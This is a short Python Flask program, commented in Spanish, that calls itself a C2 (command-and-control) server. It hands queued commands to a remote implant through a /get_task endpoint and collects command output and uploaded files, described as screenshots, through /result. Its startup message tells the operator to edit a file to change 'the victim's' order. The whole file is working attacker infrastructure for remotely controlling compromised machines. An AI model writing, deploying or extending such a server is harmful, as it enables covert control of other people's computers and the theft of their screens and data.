from flask import Flask, request
import time
import os

app = Flask(__name__)

# Archivo donde guardaremos la siguiente orden
COMMAND_FILE = "command.txt"

# Inicializamos el archivo con un comando inofensivo
if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        f.write("info")

@app.route('/get_task')
def task():
    """Lee el comando con logs detallados para depuración"""
    try:
        abs_path = os.path.abspath(COMMAND_FILE)
        print(f"[*] Solicitud recibida. Leyendo desde: {abs_path}")
        
        if os.path.exists(COMMAND_FILE):
            with open(COMMAND_FILE, "r") as f:
                command = f.read().strip()
            
            print(f"[*] Contenido encontrado: '{command}'")
            
            if command and command != "esperar":
                with open(COMMAND_FILE, "w") as f:
                    f.write("esperar")
                print("[!] Comando enviado y archivo limpiado.")
                return command
        else:
            print("[!] ERROR: El archivo command.txt no existe en esa ruta.")
        
        return "esperar"
    except Exception as e:
        print(f"[!] Error leyendo el archivo: {e}")
        return "esperar"

@app.route('/result', methods=['POST'])
def result():
    print(f"\n[!] Respuesta recibida a las {time.strftime('%H:%M:%S')}:")
    
    # Manejo de archivos (screenshots)
    if 'file' in request.files:
        file = request.files['file']
        filename = f"received_{int(time.time())}_{file.filename}"
        file.save(filename)
        print(f"    [+] Archivo guardado: {filename}")
        return "File Saved"
    
    # Manejo de texto
    output = request.form.get('output')
    print(f"    [+] Resultado:\n{output}")
    return "OK"

if __name__ == '__main__':
    print("[*] Servidor C2 iniciado.")
    print(f"[*] Para cambiar la orden de la victima, edita el archivo '{COMMAND_FILE}'")
    app.run(port=5000)
